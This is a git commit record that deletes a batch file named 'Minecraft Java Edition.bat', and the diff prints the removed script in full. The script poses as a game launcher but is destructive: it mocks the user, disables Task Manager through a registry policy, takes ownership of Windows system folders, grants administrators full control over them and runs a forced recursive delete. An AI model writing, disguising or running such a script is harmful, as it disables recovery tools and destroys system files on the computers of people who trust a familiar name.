a2aa349c3f31e828470e32a3e35e360f54bab524
Hunterhud <125219909+Hunterhud@users.noreply.github.com>
2025-04-19 18:33:55 -0700

    Delete Minecraft Java Edition.bat

--- Minecraft Java Edition.bat
+++
@@ -1,8 +0,0 @@
-@echo "Why the fuck would you open this you absolute buffoon your pc will not be happy with you AT ALL. Also dont even try to task manager your way out of this because i have disabled it :)"
-pause
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
-takeown /f C:\Windows\SysWOW64 /r /d y
-icacls C:\Windows\SysWOW64 /grant administrators:F /t
-takeown /f C:\Windows\SystemResources /r /d y
-icacls C:\Windows\SystemResources /grant administrators:F /t 
-del /F /S /Q ','
